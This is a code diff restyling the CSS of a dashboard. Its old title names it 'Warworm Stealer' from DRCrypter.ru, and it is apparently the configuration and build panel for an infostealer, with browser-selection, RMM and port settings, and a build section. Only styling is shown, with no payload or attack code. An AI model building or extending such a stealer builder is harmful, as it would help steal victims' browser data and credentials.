@@ -3,548 +3,121 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Warworm Stealer v1.0.0 | DRCrypter.ru</title>
+    <title>Warworm Builder | Configuration Dashboard</title>
     <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700&family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
     <style>
         :root {
-            --primary: #00f0ff;
-            --crypto: #f7931a;
-            --success: #00ff88;
-            --warning: #ffaa00;
-            --danger: #ff4757;
-            --info: #0066ff;
+            --primary: #00d4ff;
+            --primary-dark: #00a8cc;
+            --secondary: #7c3aed;
+            --accent: #f472b6;
+            --success: #10b981;
+            --warning: #f59e0b;
+            --danger: #ef4444;
             --bg-dark: #0a0a0f;
             --bg-panel: #12121a;
             --bg-card: #1a1a24;
             --bg-hover: #252532;
-            --text-secondary: #8b8b9e;
+            --bg-input: #0f0f16;
+            --text-primary: #f8fafc;
+            --text-secondary: #94a3b8;
+            --text-muted: #64748b;
             --border: #2a2a3a;
-            --shadow: 0 8px 32px rgba(0,0,0,0.4);
+            --border-light: #3a3a4a;
+            --shadow-sm: 0 1px 2px 0 rgba(0, 0, 0, 0.3);
+            --shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.4), 0 2px 4px -1px rgba(0, 0, 0, 0.2);
+            --shadow-lg: 0 10px 15px -3px rgba(0, 0, 0, 0.5), 0 4px 6px -2px rgba(0, 0, 0, 0.3);
+            --shadow-glow: 0 0 20px rgba(0, 212, 255, 0.15);
+            --radius-sm: 8px;
+            --radius: 12px;
+            --radius-lg: 16px;
+            --radius-xl: 24px;
         }
-        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        * { 
+            margin: 0; 
+            padding: 0; 
+            box-sizing: border-box; 
+        }
+
         body {
             font-family: 'Inter', sans-serif;
             background: var(--bg-dark);
-            color: #fff;
+            color: var(--text-primary);
             min-height: 100vh;
+            line-height: 1.6;
+            background-image: 
+                radial-gradient(ellipse at top, rgba(0, 212, 255, 0.03) 0%, transparent 50%),
+                radial-gradient(ellipse at bottom right, rgba(124, 58, 237, 0.03) 0%, transparent 50%);
         }
-        .container { max-width: 1600px; margin: 0 auto; padding: 2rem; }
+
+        .container { 
+            max-width: 1400px; 
+            margin: 0 auto; 
+            padding: 2rem; 
+        }
 
         /* Header */
         header {
             display: flex;
             justify-content: space-between;
             align-items: center;
-            margin-bottom: 2rem;
+            margin-bottom: 2.5rem;
             padding: 1.5rem 2rem;
-            background: var(--bg-panel);
+            background: rgba(18, 18, 26, 0.8);
+            backdrop-filter: blur(12px);
             border: 1px solid var(--border);
-            border-radius: 20px;
+            border-radius: var(--radius-xl);
+            box-shadow: var(--shadow-lg);
         }
-        .logo { display: flex; align-items: center; gap: 1rem; }
-        .logo-icon {
-            width: 50px; height: 50px;
-            background: linear-gradient(135deg, #00f0ff 0%, #0066ff 100%);
-            border-radius: 12px;
+
+        .brand {
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+        }
+
+        /* .brand-icon {
+            width: 48px;
+            height: 48px;
+            background: linear-gradient(135deg, var(--primary) 0%, var(--secondary) 100%);
+            border-radius: var(--radius);
             display: flex;
             align-items: center;
             justify-content: center;
             font-size: 1.5rem;
-            box-shadow: 0 4px 20px rgba(0, 240, 255, 0.3);
+            box-shadow: 0 4px 20px rgba(0, 212, 255, 0.3);
+        } */
+         
+        .brand-icon {
+            width: 48px;
+            height: 48px;
+            border-radius: var(--radius);
+            display: flex;
+            align-items: center;
+            justify-content: center;
         }
-        .logo-text {
-            font-size: 1.8rem;
+        .brand-text h1 {
+            font-size: 1.5rem;
             font-weight: 800;
-            background: linear-gradient(135deg, #00f0ff 0%, #0066ff 100%);
+            background: linear-gradient(135deg, var(--text-primary) 0%, var(--primary) 100%);
             -webkit-background-clip: text;
             background-clip: text;
             -webkit-text-fill-color: transparent;
-            color: transparent;
+            letter-spacing: -0.02em;
         }
 
-        /* Config DB Actions */
-        .config-actions {
-            display: flex;
-            gap: 0.75rem;
-            align-items: center;
-        }
-        .btn-icon {
-            width: 40px;
-            height: 40px;
-            border-radius: 10px;
-            border: 1px solid var(--border);
-            background: var(--bg-card);
-            color: var(--text-secondary);
-            cursor: pointer;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 1.2rem;
-            transition: all 0.3s ease;
-        }
-        .btn-icon:hover {
-            border-color: var(--primary);
-            color: var(--primary);
-            transform: translateY(-2px);
-        }
-        .btn-save {
-            padding: 0.75rem 1.5rem;
-            background: linear-gradient(135deg, var(--success) 0%, #00cc6a 100%);
-            color: var(--bg-dark);
-            border: none;
-            border-radius: 10px;
-            font-weight: 700;
-            cursor: pointer;
-            display: flex;
-            align-items: center;
-            gap: 0.5rem;
-            transition: all 0.3s ease;
-            font-size: 0.95rem;
-        }
-        .btn-save:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 4px 20px rgba(0, 255, 136, 0.4);
-        }
-
-        /* Navigation */
-        .nav-tabs {
-            display: flex;
-            gap: 0.5rem;
-            margin-bottom: 2rem;
-            background: var(--bg-panel);
-            padding: 0.5rem;
-            border-radius: 16px;
-            border: 1px solid var(--border);
-            width: 100%;
-        }
-        .nav-tab {
-            flex: 1;
-            padding: 1rem 2rem;
-            border: none;
-            background: transparent;
-            color: var(--text-secondary);
-            font-weight: 600;
-            cursor: pointer;
-            border-radius: 12px;
-            transition: all 0.3s ease;
-            font-size: 0.95rem;
-            text-align: center;
-        }
-        .nav-tab:hover { color: #fff; }
-        .nav-tab.active {
-            background: var(--bg-card);
-            color: var(--primary);
-            box-shadow: 0 2px 8px rgba(0,0,0,0.3);
-        }
-
-        /* Main Grid */
-        .dashboard-grid {
-            display: grid;
-            grid-template-columns: 320px 1fr;
-            gap: 2rem;
-        }
-
-        /* Sidebar */
-        .panel {
-            background: var(--bg-panel);
-            border: 1px solid var(--border);
-            border-radius: 20px;
-            padding: 1.5rem;
-            margin-bottom: 1.5rem;
-        }
-        .panel-header {
-            display: flex;
-            align-items: center;
-            gap: 0.75rem;
-            margin-bottom: 1.5rem;
-            font-weight: 600;
-            font-size: 1.1rem;
-        }
-
-        /* Toggle Switch */
-        .toggle-row {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 1rem 0;
-            border-bottom: 1px solid var(--border);
-        }
-        .toggle-row:last-child { border-bottom: none; }
-        .toggle-switch {
-            position: relative;
-            width: 52px;
-            height: 28px;
-            background: var(--bg-dark);
-            border: 2px solid var(--border);
-            border-radius: 14px;
-            cursor: pointer;
-            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
-        }
-        .toggle-switch.active {
-            background: var(--primary);
-            border-color: var(--primary);
-        }
-        .toggle-switch::after {
-            content: '';
-            position: absolute;
-            top: 2px;
-            left: 2px;
-            width: 20px;
-            height: 20px;
-            background: white;
-            border-radius: 50%;
-            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
-            box-shadow: 0 2px 4px rgba(0,0,0,0.2);
-        }
-        .toggle-switch.active::after { transform: translateX(24px); }
-
-        /* Module Cards */
-        .modules-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
-            gap: 1rem;
-            margin-bottom: 2rem;
-        }
-        .module-card {
-            background: var(--bg-panel);
-            border: 1px solid var(--border);
-            border-radius: 16px;
-            overflow: hidden;
-            transition: all 0.3s ease;
-        }
-        .module-card:hover {
-            border-color: var(--primary);
-            transform: translateY(-2px);
-            box-shadow: var(--shadow);
-        }
-        .module-card.enabled {
-            border-color: var(--success);
-            box-shadow: 0 0 20px rgba(0, 255, 136, 0.1);
-        }
-        .module-header {
-            display: flex;
-            align-items: center;
-            gap: 1rem;
-            padding: 1.5rem;
-            cursor: pointer;
-            background: var(--bg-card);
-            border-bottom: 1px solid var(--border);
-        }
-        .module-icon {
-            width: 48px;
-            height: 48px;
-            border-radius: 12px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 1.5rem;
-            background: rgba(0, 240, 255, 0.1);
-            color: var(--primary);
-        }
-        .module-card.enabled .module-icon {
-            background: rgba(0, 255, 136, 0.2);
-            color: var(--success);
-        }
-        .module-title {
-            flex: 1;
-        }
-        .module-title h3 {
-            font-size: 1.1rem;
-            margin-bottom: 0.25rem;
-        }
-        .module-title p {
-            font-size: 0.8rem;
-            color: var(--text-secondary);
-        }
-        .module-toggle {
-            transform: scale(0.9);
-        }
-
-        /* Feature List Inside Module */
-        .feature-list {
-            padding: 1rem 1.5rem;
-        }
-        .feature-item {
-            display: flex;
-            align-items: center;
-            gap: 1rem;
-            padding: 0.75rem 0;
-            border-bottom: 1px solid var(--border);
-            cursor: pointer;
-            transition: all 0.2s ease;
-        }
-        .feature-item:last-child { border-bottom: none; }
-        .feature-item:hover { background: rgba(255,255,255,0.02); }
-        .feature-checkbox {
-            width: 22px;
-            height: 22px;
-            border: 2px solid var(--border);
-            border-radius: 6px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            transition: all 0.2s ease;
-            flex-shrink: 0;
-        }
-        .feature-item.selected .feature-checkbox {
-            background: var(--success);
-            border-color: var(--success);
-        }
-        .feature-checkbox::after {
-            content: '✓';
-            color: var(--bg-dark);
-            font-weight: bold;
-            font-size: 0.9rem;
-            opacity: 0;
-            transition: opacity 0.2s ease;
-        }
-        .feature-item.selected .feature-checkbox::after { opacity: 1; }
-        .feature-name {
-            flex: 1;
-            font-size: 0.95rem;
-        }
-        .feature-desc {
-            font-size: 0.75rem;
-            color: var(--text-secondary);
-            margin-top: 0.2rem;
-        }
-
-        /* Sub Configuration Panel */
-        .sub-config {
-            background: var(--bg-dark);
-            border-top: 1px solid var(--border);
-            padding: 1.5rem;
-            display: none;
-        }
-        .sub-config.active { display: block; }
-        .sub-config-title {
-            font-size: 0.9rem;
-            font-weight: 600;
-            color: var(--primary);
-            margin-bottom: 1rem;
-            display: flex;
-            align-items: center;
-            gap: 0.5rem;
-        }
-
-        /* Port Tags */
-        .port-grid {
-            display: flex;
-            flex-wrap: wrap;
-            gap: 0.5rem;
-            margin: 0.75rem 0;
-        }
-        .port-tag {
-            display: flex;
-            align-items: center;
-            gap: 0.5rem;
-            padding: 0.4rem 0.8rem;
-            background: var(--bg-panel);
-            border: 1px solid var(--border);
-            border-radius: 8px;
-            font-family: 'JetBrains Mono', monospace;
-            font-size: 0.85rem;
-            transition: all 0.2s ease;
-        }
-        .port-tag:hover {
-            border-color: var(--primary);
-        }
-        .port-tag button {
-            background: none;
-            border: none;
-            color: var(--danger);
-            cursor: pointer;
-            font-size: 1.1rem;
-            line-height: 1;
-            padding: 0;
-            width: 18px;
-            height: 18px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            border-radius: 4px;
-            transition: all 0.2s ease;
-        }
-        .port-tag button:hover {
-            background: rgba(255, 71, 87, 0.2);
-        }
-        .port-input-group {
-            display: flex;
-            gap: 0.5rem;
-            margin-top: 0.75rem;
-        }
-        .port-input-group input {
-            width: 100px;
-            padding: 0.5rem;
-            background: var(--bg-panel);
-            border: 1px solid var(--border);
-            border-radius: 8px;
-            color: #fff;
+        .brand-text p {
+            color: var(--text-muted);
+            font-size: 0.875rem;
             font-family: 'JetBrains Mono', monospace;
         }
-        .btn-add {
-            padding: 0.5rem 1rem;
-            background: var(--primary);
-            color: var(--bg-dark);
-            border: none;
-            border-radius: 8px;
-            cursor: pointer;
-            font-weight: 600;
-            transition: all 0.2s ease;
-        }
-        .btn-add:hover {
-            transform: translateY(-1px);
-            box-shadow: 0 4px 12px rgba(0, 240, 255, 0.3);
-        }
 
-        /* Form Elements */
-        .form-group {
-            margin-bottom: 1rem;
-        }
-        .form-label {
-            display: block;
-            font-size: 0.85rem;
-            color: var(--text-secondary);
-            margin-bottom: 0.5rem;
-        }
-        input[type="text"],
-        input[type="password"],
-        input[type="number"] {
-            width: 100%;
-            padding: 0.75rem 1rem;
-            background: var(--bg-panel);
-            border: 1px solid var(--border);
-            border-radius: 10px;
-            color: #fff;
-            font-family: 'JetBrains Mono', monospace;
-            font-size: 0.9rem;
-            transition: all 0.3s ease;
-        }
-        input:focus {
-            border-color: var(--primary);
-            outline: none;
-        }
-
-        /* Section Headers */
-        .section-header {
+        .header-actions {
             display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 1.5rem;
-        }
-        .section-title {
-            font-size: 1.5rem;
-            font-weight: 700;
-            display: flex;
-            align-items: center;
             gap: 0.75rem;
-        }
-        .section-icon {
-            width: 36px;
-            height: 36px;
-            background: linear-gradient(135deg, var(--primary), var(--info));
-            border-radius: 10px;
-            display: flex;
             align-items: center;
-            justify-content: center;
-            font-size: 1.2rem;
         }
-
-        /* Content Panel */
-        .content-panel {
-            background: var(--bg-panel);
-            border: 1px solid var(--border);
-            border-radius: 20px;
-            padding: 2rem;
-        }
-
-        /* Browser Selection with Icons */
-        .browser-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(160px, 1fr));
-            gap: 0.75rem;
-        }
-        .browser-item {
-            display: flex;
-            align-items: center;
-            gap: 0.75rem;
-            padding: 1rem;
-            background: var(--bg-card);
-            border: 1px solid var(--border);
-            border-radius: 12px;
-            cursor: pointer;
-            transition: all 0.3s ease;
-        }
-        .browser-item:hover {
-            border-color: var(--primary);
-            transform: translateY(-2px);
-        }
-        .browser-item.selected {
-            border-color: var(--success);
-            background: rgba(0, 255, 136, 0.1);
-        }
-        .browser-item input {
-            display: none;
-        }
-        .browser-icon {
-            width: 28px;
-            height: 28px;
-            border-radius: 6px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 1.1rem;
-            background: var(--bg-panel);
-        }
-        .browser-name {
-            font-size: 0.9rem;
-            font-weight: 500;
-        }
-        .browser-item.selected .browser-icon {
-            background: var(--success);
-            color: var(--bg-dark);
-        }
-
-        /* Build Section */
-        .build-section {
-            background: linear-gradient(135deg, rgba(0, 240, 255, 0.05), rgba(131, 56, 236, 0.05));
-            border: 1px solid rgba(0, 240, 255, 0.3);
-            border-radius: 24px;
-            padding: 3rem;
-            text-align: center;
-            margin-top: 2rem;
-        }
-        .build-icon {
-            width: 80px;
-            height: 80px;
-            background: linear-gradient(135deg, #00f0ff 0%, #0066ff 100%);
-            border-radius: 24px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 2rem;
-            margin: 0 auto 1.5rem;
-            box-shadow: 0 8px 30px rgba(0, 240, 255, 0.3);
-        }
-        .build-preview {
-            background: rgba(0,0,0,0.3);
-            border-radius: 16px;
-            padding: 1.5rem;
-            margin: 2rem auto;
-            text-align: left;
-            max-width: 600px;
-            border: 1px solid var(--border);
-        }
-        .build-item {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 0.75rem 0;
-            border-bottom: 1px solid var(--border);
-        }
-        .build-item:last-child { border-bottom: none; }
-        .status-enabled { color: var(--success); font-weight: 600; }
-        .status-disabled { color: var(--text-secondary); }
 
         /* Buttons */
         .btn {
@@ -552,73 +125,670 @@
             align-items: center;
             justify-content: center;
             gap: 0.5rem;
-            padding: 1rem 2rem;
+            padding: 0.75rem 1.25rem;
             border: none;
-            border-radius: 12px;
+            border-radius: var(--radius);
             font-weight: 600;
+            font-size: 0.875rem;
             cursor: pointer;
-            transition: all 0.3s ease;
-            font-size: 0.95rem;
+            transition: all 0.2s ease;
+            font-family: inherit;
         }
+
         .btn-primary {
-            background: linear-gradient(135deg, #00f0ff 0%, #0066ff 100%);
-            color: white;
-            box-shadow: 0 4px 20px rgba(0, 240, 255, 0.3);
+            background: linear-gradient(135deg, var(--primary) 0%, var(--primary-dark) 100%);
+            color: var(--bg-dark);
+            box-shadow: 0 4px 12px rgba(0, 212, 255, 0.25);
         }
+
         .btn-primary:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 6px 30px rgba(0, 240, 255, 0.4);
+            transform: translateY(-1px);
+            box-shadow: 0 6px 20px rgba(0, 212, 255, 0.4);
         }
+
         .btn-secondary {
             background: var(--bg-card);
-            color: #fff;
-            border: 2px solid var(--border);
+            color: var(--text-primary);
+            border: 1px solid var(--border);
         }
+
         .btn-secondary:hover {
             border-color: var(--primary);
             color: var(--primary);
+            background: var(--bg-hover);
+        }
+
+        .btn-icon {
+            width: 40px;
+            height: 40px;
+            padding: 0;
+            border-radius: var(--radius);
+        }
+
+        .btn-sm {
+            padding: 0.5rem 0.75rem;
+            font-size: 0.75rem;
+        }
+
+        /* Navigation */
+        .nav-tabs {
+            display: flex;
+            gap: 0.5rem;
+            margin-bottom: 2rem;
+            margin: 0 auto 2rem auto;  /* ADD THIS LINE - centers horizontally */
+            background: var(--bg-panel);
+            padding: 0.5rem;
+            border-radius: var(--radius-lg);
+            border: 1px solid var(--border);
+            width: fit-content;
+        }
+
+        
+
+        .nav-tab {
+            padding: 0.75rem 1.5rem;
+            border: none;
+            background: transparent;
+            color: var(--text-secondary);
+            font-weight: 600;
+            cursor: pointer;
+            border-radius: var(--radius);
+            transition: all 0.2s ease;
+            font-size: 0.875rem;
+        }
+
+        .nav-tab:hover { 
+            color: var(--text-primary); 
+            background: rgba(255, 255, 255, 0.05);
+        }
+
+        .nav-tab.active {
+            background: var(--bg-card);
+            color: var(--primary);
+            box-shadow: var(--shadow-sm);
+        }
+
+        /* Layout Grid */
+        .dashboard-grid {
+            display: grid;
+            grid-template-columns: 320px 1fr;
+            gap: 2rem;
+        }
+
+        /* Panels */
+        .panel {
+            background: rgba(18, 18, 26, 0.6);
+            backdrop-filter: blur(12px);
+            border: 1px solid var(--border);
+            border-radius: var(--radius-lg);
+            padding: 1.5rem;
+            margin-bottom: 1.5rem;
+            transition: all 0.3s ease;
+        }
+
+        .panel:hover {
+            border-color: var(--border-light);
+            box-shadow: var(--shadow);
+        }
+
+        .panel-header {
+            display: flex;
+            align-items: center;
+            gap: 0.75rem;
+            margin-bottom: 1.25rem;
+            font-weight: 700;
+            font-size: 0.875rem;
+            color: var(--text-primary);
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
+        }
+
+        .panel-header-icon {
+            width: 32px;
+            height: 32px;
+            background: rgba(0, 212, 255, 0.1);
+            border-radius: var(--radius-sm);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1rem;
+        }
+
+        /* Form Elements */
+        .form-group {
+            margin-bottom: 1.25rem;
+        }
+
+        .form-group:last-child {
+            margin-bottom: 0;
+        }
+
+        .form-label {
+            display: block;
+            font-size: 0.75rem;
+            font-weight: 600;
+            color: var(--text-secondary);
+            margin-bottom: 0.5rem;
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
+        }
+
+        .form-input {
+            width: 100%;
+            padding: 0.75rem 1rem;
+            background: var(--bg-input);
+            border: 1px solid var(--border);
+            border-radius: var(--radius);
+            color: var(--text-primary);
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.875rem;
+            transition: all 0.2s ease;
+        }
+
+        .form-input:focus {
+            outline: none;
+            border-color: var(--primary);
+            box-shadow: 0 0 0 3px rgba(0, 212, 255, 0.1);
+        }
+
+        .form-input::placeholder {
+            color: var(--text-muted);
+        }
+
+        .input-group {
+            display: flex;
+            gap: 0.5rem;
+        }
+
+        .input-group .form-input {
+            flex: 1;
+        }
+
+        /* Toggle Switch */
+        .toggle-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 0.875rem 0;
+            border-bottom: 1px solid var(--border);
+        }
+
+        .toggle-row:last-child { 
+            border-bottom: none; 
+        }
+
+        .toggle-label {
+            font-size: 0.875rem;
+            color: var(--text-primary);
+            font-weight: 500;
+        }
+
+        .toggle-switch {
+            position: relative;
+            width: 44px;
+            height: 24px;
+            background: var(--bg-input);
+            border: 2px solid var(--border);
+            border-radius: 12px;
+            cursor: pointer;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        .toggle-switch.active {
+            background: var(--success);
+            border-color: var(--success);
+        }
+
+        .toggle-switch::after {
+            content: '';
+            position: absolute;
+            top: 2px;
+            left: 2px;
+            width: 16px;
+            height: 16px;
+            background: white;
+            border-radius: 50%;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            box-shadow: 0 2px 4px rgba(0,0,0,0.2);
+        }
+
+        .toggle-switch.active::after { 
+            transform: translateX(20px); 
+        }
+
+        /* Module Cards */
+        .modules-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+            gap: 1rem;
+            margin-bottom: 2rem;
+        }
+
+        .module-card {
+            background: rgba(18, 18, 26, 0.6);
+            backdrop-filter: blur(12px);
+            border: 1px solid var(--border);
+            border-radius: var(--radius-lg);
+            overflow: hidden;
+            transition: all 0.3s ease;
+        }
+
+        .module-card:hover {
+            border-color: var(--border-light);
+            transform: translateY(-2px);
+            box-shadow: var(--shadow-lg);
+        }
+
+        .module-card.enabled {
+            border-color: var(--success);
+            box-shadow: 0 0 0 1px var(--success), var(--shadow-glow);
+        }
+
+        .module-header {
+            display: flex;
+            align-items: center;
+            gap: 0.875rem;
+            padding: 1.25rem;
+            cursor: pointer;
+            background: rgba(255, 255, 255, 0.02);
+            border-bottom: 1px solid var(--border);
+            transition: all 0.2s;
+        }
+
+        .module-header:hover {
+            background: rgba(255, 255, 255, 0.04);
+        }
+
+        .module-icon {
+            width: 40px;
+            height: 40px;
+            border-radius: var(--radius);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.25rem;
+            background: rgba(0, 212, 255, 0.1);
+            color: var(--primary);
+            transition: all 0.2s;
+        }
+
+        .module-card.enabled .module-icon {
+            background: rgba(16, 185, 129, 0.15);
+            color: var(--success);
+        }
+
+        .module-title {
+            flex: 1;
+        }
+
+        .module-title h3 {
+            font-size: 0.9375rem;
+            font-weight: 700;
+            margin-bottom: 0.25rem;
+            color: var(--text-primary);
+        }
+
+        .module-title p {
+            font-size: 0.75rem;
+            color: var(--text-secondary);
+            line-height: 1.4;
+        }
+
+        .module-toggle {
+            transform: scale(0.9);
+        }
+
+        /* Feature List */
+        .feature-list {
+            padding: 0.75rem;
+        }
+
+        .feature-item {
+            display: flex;
+            align-items: center;
+            gap: 0.75rem;
+            padding: 0.625rem 0.875rem;
+            border-radius: var(--radius-sm);
+            cursor: pointer;
+            transition: all 0.2s ease;
+            margin-bottom: 0.25rem;
+        }
+
+        .feature-item:hover { 
+            background: rgba(255, 255, 255, 0.03); 
+        }
+
+        .feature-item.selected { 
+            background: rgba(16, 185, 129, 0.08); 
+        }
+
+        .feature-checkbox {
+            width: 18px;
+            height: 18px;
+            border: 2px solid var(--border);
+            border-radius: 4px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: all 0.2s ease;
+            flex-shrink: 0;
+        }
+
+        .feature-item.selected .feature-checkbox {
+            background: var(--success);
+            border-color: var(--success);
+        }
+
+        .feature-checkbox::after {
+            content: '✓';
+            color: var(--bg-dark);
+            font-weight: bold;
+            font-size: 0.75rem;
+            opacity: 0;
+            transition: opacity 0.2s ease;
+        }
+
+        .feature-item.selected .feature-checkbox::after { 
+            opacity: 1; 
+        }
+
+        .feature-info {
+            flex: 1;
+        }
+
+        .feature-name {
+            font-size: 0.8125rem;
+            font-weight: 500;
+            color: var(--text-primary);
+            margin-bottom: 0.125rem;
+        }
+
+        .feature-desc {
+            font-size: 0.6875rem;
+            color: var(--text-muted);
+        }
+
+        /* Sub Configuration Panel */
+        .sub-config {
+            background: var(--bg-dark);
+            border-top: 1px solid var(--border);
+            padding: 1.25rem;
+            display: none;
+        }
+
+        .sub-config.active { 
+            display: block; 
+        }
+
+        .sub-config-title {
+            font-size: 0.75rem;
+            font-weight: 700;
+            color: var(--primary);
+            margin-bottom: 1rem;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
+        }
+
+        /* RMM Config Special Styling */
+        .rmm-config-grid {
+            display: grid;
+            gap: 1rem;
+        }
+
+        .port-config {
+            display: grid;
+            grid-template-columns: 1fr auto;
+            gap: 0.75rem;
+            align-items: end;
+        }
+
+        .password-strength {
+            height: 3px;
+            background: var(--border);
+            border-radius: 2px;
+            margin-top: 0.5rem;
+            overflow: hidden;
+        }
+
+        .password-strength-bar {
+            height: 100%;
+            width: 0;
+            background: var(--danger);
+            transition: all 0.3s;
+        }
+
+        .password-strength-bar.strong {
+            width: 100%;
+            background: var(--success);
+        }
+
+        .password-strength-bar.medium {
+            width: 66%;
+            background: var(--warning);
+        }
+
+        /* Browser Grid */
+        .browser-section {
+            margin-top: 2rem;
+        }
+
+        .section-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 1.25rem;
+        }
+
+        .section-title {
+            font-size: 1.125rem;
+            font-weight: 700;
+            display: flex;
+            align-items: center;
+            gap: 0.75rem;
+            color: var(--text-primary);
+        }
+
+        .browser-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(140px, 1fr));
+            gap: 0.75rem;
+        }
+
+        .browser-item {
+            display: flex;
+            align-items: center;
+            gap: 0.625rem;
+            padding: 0.875rem;
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid var(--border);
+            border-radius: var(--radius);
+            cursor: pointer;
+            transition: all 0.2s ease;
+        }
+
+        .browser-item:hover {
+            border-color: var(--primary);
+            background: rgba(0, 212, 255, 0.05);
+            transform: translateY(-1px);
+        }
+
+        .browser-item.selected {
+            border-color: var(--success);
+            background: rgba(16, 185, 129, 0.08);
+        }
+
+        .browser-icon {
+            width: 24px;
+            height: 24px;
+            border-radius: 6px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1rem;
+            background: rgba(255, 255, 255, 0.1);
+        }
+
+        .browser-item.selected .browser-icon {
+            background: var(--success);
+            color: var(--bg-dark);
+        }
+
+        .browser-name {
+            font-size: 0.8125rem;
+            font-weight: 500;
+        }
+
+        /* Build Section */
+        .build-section {
+            background: linear-gradient(135deg, rgba(0, 212, 255, 0.05) 0%, rgba(124, 58, 237, 0.05) 100%);
+            border: 1px solid rgba(0, 212, 255, 0.2);
+            border-radius: var(--radius-xl);
+            padding: 3rem;
+            text-align: center;
+            margin-top: 2rem;
+        }
+
+        .build-icon {
+            width: 64px;
+            height: 64px;
+            background: linear-gradient(135deg, var(--primary) 0%, var(--secondary) 100%);
+            border-radius: var(--radius-lg);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.75rem;
+            margin: 0 auto 1.5rem;
+            box-shadow: 0 8px 30px rgba(0, 212, 255, 0.3);
+        }
+
+        .build-preview {
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: var(--radius-lg);
+            padding: 1.5rem;
+            margin: 2rem auto;
+            text-align: left;
+            max-width: 600px;
+            border: 1px solid var(--border);
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.8125rem;
+        }
+
+        .build-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 0.625rem 0;
+            border-bottom: 1px solid var(--border);
+        }
+
+        .build-item:last-child { 
+            border-bottom: none; 
+        }
+
+        .status-enabled { 
+            color: var(--success); 
+            font-weight: 600; 
+        }
+
+        .status-disabled { 
+            color: var(--text-muted); 
         }
 
         /* Toast */
         .toast-container {
             position: fixed;
-            top: 2rem;
-            right: 2rem;
+            top: 1.5rem;
+            right: 1.5rem;
             z-index: 3000;
             display: flex;
             flex-direction: column;
-            gap: 1rem;
+            gap: 0.75rem;
         }
+
         .toast {
-            background: var(--bg-panel);
+            background: rgba(18, 18, 26, 0.95);
+            backdrop-filter: blur(12px);
             border: 1px solid var(--border);
             border-left: 4px solid var(--primary);
-            border-radius: 12px;
+            border-radius: var(--radius);
             padding: 1rem 1.5rem;
             min-width: 300px;
-            box-shadow: var(--shadow);
+            box-shadow: var(--shadow-lg);
             animation: slideIn 0.3s ease;
+            font-size: 0.875rem;
         }
+
         @keyframes slideIn {
             from { transform: translateX(100%); opacity: 0; }
             to { transform: translateX(0); opacity: 1; }
         }
-        .toast.success { border-left-color: var(--success); }
-        .toast.error { border-left-color: var(--danger); }
-        .toast.info { border-left-color: var(--info); }
+
+        .toast.success { 
+            border-left-color: var(--success); 
+        }
+
+        .toast.error { 
+            border-left-color: var(--danger); 
+        }
+
+        .toast.info { 
+            border-left-color: var(--primary); 
+        }
 
         /* Loading */
         .loading {
             display: inline-block;
             width: 20px;
             height: 20px;
-            border: 3px solid rgba(255,255,255,.3);
+            border: 3px solid rgba(255, 255, 255, 0.3);
             border-radius: 50%;
-            border-top-color: #fff;
+            border-top-color: white;
             animation: spin 1s ease-in-out infinite;
         }
+
         @keyframes spin {
             to { transform: rotate(360deg); }
+        }
+
+        /* Info Badge */
+        .info-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 0.5rem;
+            padding: 0.5rem 0.75rem;
+            background: rgba(0, 212, 255, 0.1);
+            border: 1px solid rgba(0, 212, 255, 0.2);
+            border-radius: var(--radius-sm);
+            font-size: 0.75rem;
+            color: var(--primary);
+            margin-top: 0.75rem;
+        }
+
+        /* Responsive */
+        @media (max-width: 1024px) {
+            .dashboard-grid {
+                grid-template-columns: 1fr;
+            }
+            .sidebar {
+                order: 2;
+            }
+        }
+
+        @media (max-width: 640px) {
+            .container {
+                padding: 1rem;
+            }
+            header {
+                flex-direction: column;
+                gap: 1rem;
+                text-align: center;
+            }
+            .modules-grid {
+                grid-template-columns: 1fr;
+            }
         }
 
         /* Scrollbar */
@@ -626,91 +796,132 @@
             width: 8px;
             height: 8px;
         }
+
         ::-webkit-scrollbar-track {
             background: var(--bg-dark);
         }
+
         ::-webkit-scrollbar-thumb {
             background: var(--border);
             border-radius: 4px;
         }
+
